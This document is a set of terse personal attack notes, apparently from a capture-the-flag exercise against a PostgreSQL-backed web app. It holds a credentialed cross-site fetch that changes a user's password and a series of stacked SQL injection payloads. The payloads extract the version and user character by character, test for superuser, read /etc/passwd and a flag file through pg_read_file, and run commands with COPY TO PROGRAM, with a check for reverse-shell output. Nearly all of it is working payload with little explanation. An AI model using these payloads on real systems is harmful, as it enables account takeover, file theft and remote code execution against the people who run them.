Fetch -> sql website with rabbit

fetch("https://192.168.62.62:8443/api/me/password", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
  },
  body: "password=testtest",
  credentials: "include"
});


version
00000000-0000-0000-0000-000000000000'; (SELECT CAST(ASCII(SUBSTRING(version(),1,1)) AS integer))--
cant be tested multiple times
SUBSTRING(version(),2,1)
SUBSTRING(version(),3,1)

current user
00000000-0000-0000-0000-000000000000'; (SELECT CAST(ASCII(SUBSTRING(current_user,1,1)) AS integer))--

superuser 1 if yes 0 if no
00000000-0000-0000-0000-000000000000'; (SELECT CAST((SELECT CASE WHEN rolsuper THEN 1 ELSE 0 END FROM pg_roles WHERE rolname = current_user) AS integer))--



read file
00000000-0000-0000-0000-000000000000'; (SELECT CAST(LENGTH(pg_read_file('/etc/passwd', 0, 1000)) AS integer))--



shell if superuser
COPY (SELECT '') TO PROGRAM 'id > /tmp/test.txt';


Check if file readable	
' ; (SELECT CAST(LENGTH(pg_read_file('/etc/passwd',0,1000)) AS integer))--

Extract 1 char	
' ; (SELECT CAST(ASCII(SUBSTRING(pg_read_file('/etc/passwd',0,1000),1,1)) AS integer))--

Check for flag file	
' ; (SELECT CAST(LENGTH(pg_read_file('/flag.txt',0,1000)) AS integer))--

Dump flag.txt	
' ; (SELECT CAST(ASCII(SUBSTRING(pg_read_file('/flag.txt',0,1000),1,1)) AS integer))--

RCE file existence check	
' ; (SELECT CAST(LENGTH(pg_read_file('/tmp/test.txt',0,100)) AS integer))--

Check for reverse shell output	
' ; (SELECT CAST(ASCII(SUBSTRING(pg_read_file('/tmp/shell.log',0,100),1,1)) AS integer))--
